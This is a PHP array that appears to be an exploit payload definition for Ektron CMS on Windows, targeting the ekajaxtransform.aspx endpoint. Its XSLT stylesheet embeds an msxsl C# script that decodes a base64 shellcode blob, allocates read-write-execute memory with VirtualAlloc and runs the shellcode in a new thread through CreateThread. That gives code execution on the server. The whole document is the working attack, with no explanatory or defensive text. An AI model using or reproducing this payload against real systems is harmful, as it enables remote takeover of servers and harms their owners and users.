array (
  'platform' => 'WINDOWS',
  'service' => 'EKTRON',
  'name' => 'EktronXsltExec',
  'path' => '/WorkArea/ContentDesigner/ekajaxtransform.aspx',
  'xml' => 'kOtFoqU',
  'xslt' => '<?xml version=\'1.0\'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[

private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

public string xml()
{
  string shellcode64 = @"L5tHSEdKmUlGmUtKT0dC/D+b1pJG+ED4mC+RSy+f/UonP/2RP5JBQ5lL9UM/mUf9QkKQk0L5J0GbSUebN59DSDdK/ElDSvlJn0n9Rpn8kUFCSyeX+ZZGJ5BBRp+Q/D+ZQ0ubkvU3lpFDSPVBkzcnSpM3QT/WkUtJk5DWP0j5TkqRkfj5+ZEnmU9DTksnkfmTT5AnQ5L8k5iWQ0P9kUs3k0cvSkFJ/D/41j9D9S+bL5H8Ri9AkkGRk/xJN5HWSPWXQ/ibl0NIP59Ok0r1Sp+QL0lIm9Y/QZMnkpb1N5FGJ0759ZND/UqbP5I/n/hIJ/hC/ZkvkJY3T/lAnydIn5NHSPU/m0eQkfibQydJN/lCN/WRT0H5k/VJ+Eb1Q0GbkE71SjeY1ks/SUpPL5k3kjeQ+UafmSf9N5BKmD+TQpOQ9UZOP083Nzc/my83L5mYS0KRQtaX/UCbQflLkpKZS5eRm0JH/Jj8+U4/Q/iW/ZKbSEf8R5jWP/hG+UKXRpGT/UFLTz+ZmUY3S5dJP9afLz9PmEY/m0FJS0+TLyf5RieXP/lAl0aXm5j1SieXRvgvL5KWL/2YkZ+Tl/yfT09B9f03SJcn/JuZkEj8n0ufQEFGT0iY+Dc3n0g3SUiWRpD99UNOQEpKR0iX1tb8QUY/SjdJk/2XSDf9Qj9HmUfWSkFGmEuQ+UcnQUpO+CdPkkv4+TdLQJ9CP/2f/ElASZaXmf1PT5n8kJdPlpmfm0M3TkKS/f1G1pdHP0uQP0KZSJOSk05LQvxJQEY/9UNGlkKSkfxOQUYvkpJD9UpBm0L1n/VDRkf4n0c/mZebSJgnkZsnl5A3kPmWQ/XW+JMvL0lDN5KTmEmXm0OWSpNHlj8/P0H5Tpj4R5tLmPg3lv2ZJ5dI+EuQTkDWP/VAkUFJlvlPTkBGQUr1+JOYl5+f1kJB/JhKkkv4nyc3J/VC9ZZD9UibSUk3kkuWkEhHQJ+SN9afl/mWmEM/mz+bSktKl0ZKSkOW+Uqfl0FPSZ9DTpmWR0A3+UaY/fVGkPxOTktITz+Y1kiW+ZtHL0qYm0PW1taX1pInQJNJ/flGkf1AmJNLL0mTSyeQLz+ZSPz4S5EnL/k3QkNIT5hDmEtIkfVALz+SQy8/m04/mUf9k5FHR0mbJ0I3T078SvmSQf2YSpdJmZb1k/j8L5hD/ECWSdbWR/xAQDeQn5ZDQ5b8P/yRkD/5+UZAn/lCR/xLQ5I3SkOQN0c3n5v4mJuZ/Dcnl0ZKl0hBkyf9R06Z1k/49S/8SNYnRvn5Jy8nQ5iXn5j1m0ZCQJFDl0CR/UJL/EKWR/35R0v9SE6fl/k3SE78J/kvQD9Gl5ND/PVBR0+XP0lAT/VITpZLT0CZ+UmbkUcvQZlPP0L5lpj9SPWblkabmE79L0NO+J+ZlkY/lkAv/PVHJ5ZJQpY/kdY/mZP4N0g/1kGSm5FAkDdPm/hBL9ZL9ZabSDeb1tZCJ0BKL/U3kzdOSZM/SD8vmZmXStZGmfyZSEZDTp+T+Zj8QpeZkpaQ+UBJQkGbQkL4T/kvkpdDn/VKkEpPSZhDkEHWT/35QiefQ/1KT/yY+UlC+ElHnydPQvhCkPn1k/z5L5iY1kuXkkrWQJlHTkdPkEP9Si9PL5Yvl5NIN0AnSE+Z1taYk/2Qm08/QEY3mfWTQ5iQT0BDl5ZCJ/31n0cvRkL4SpEnkUGTmUrWm0GRS06WR5ZDn/hPQE8nkPxLm/mSl/WXQNYnQkJImEOW/NaYn/xAmf2fm5P4m/yTn5JOP9aWm5ibljc/QkKR/C9Hk5P4S/yb1vgv/JBJQTf1m5n9kD+Q+EovN/lHkJBBn5A/QEH8P5j8QUhPTkaY+EuSR0qYSU71T0KYQTefmydD+E6Q/Sf4n0j19UqQk5ZLljdK+E+b1icnQ/1JRpP41khJQ0n5/ZFAQ5aQQZhOT5ebn0n8S/VPJ5ZOlpKfL0mRm/mTRpj5QtZBQEYnSUIvn0NPN0lIQEOZ+fWQ1kBLm5mYSS+QP5dGSpNOS/wvQ/WSl/g/SUubkJGQQ9b91puQQkD4mZeZL/VCk/WbQZtPkU6YltYvN/2TS0KfQkon/ZuZSflLQ04/k/mQQZYnnzf1+JtKL/38lzc3kPxOR5eRQtbWk5hGk/ifSEGWlzdC+ZlGkf38+ZlDmz8/m5hHSkEnkidGTydP1pnWQflIP0JCR/yT1vknS5ubk5BPQ0eTNy+b+f39N/yZ+f1GQEEnkZf4Pz9HJ5InQC9IN/iTQklPTz+SkDc//fyTSv1In0iZkE/4k0GZkJ8/SjeYly+QTpNLTtZOSJZCQUJDkUZBQPlGJ5Kbn9afkT+RkPj5S5I3P5CSSPhON5aZn5b4QpEvL0JHkpJGSUJDQUH9SkJHmf1KQkhLL0H1lphJk5GXP5dB/UmTn/3WP5hIR5snmfmQlpCT1pmRRphIT5vWmUqRlpNGN/z4N5FL/Z+QJ5lISPyZQ9aTR/35mD9Glp+YR5eQmZBLQkFI+J+ST0ZDQpmWSEuRQJIvSkFPkJNHTkhC9ZZBR0+S9UaYQ5Kb+EpAm5P9+UlI1kKSkEOYkkub/dZPl0ZKN5+RQ/iZJ0lBSvX9mU9DL0pDkfxLkP2ZT0JAP5mWn5aTSpORm0BLkJOXT5AvSJmQP5FBn0pKR/WWmDdGJ5BASNZPQEk3+UNKkJeQ/daYkfWT+JtPmZgvJ5JON5NPmz/8kEqT+E6f+EhBgcRU8v//X19QQVlMT0FEX18=";
  byte[] shellcode = System.Convert.FromBase64String(shellcode64);
  UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
  IntPtr hThread = IntPtr.Zero;
  IntPtr pinfo = IntPtr.Zero;
  UInt32 threadId = 0;
  hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
  return "cZOOq";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
',
)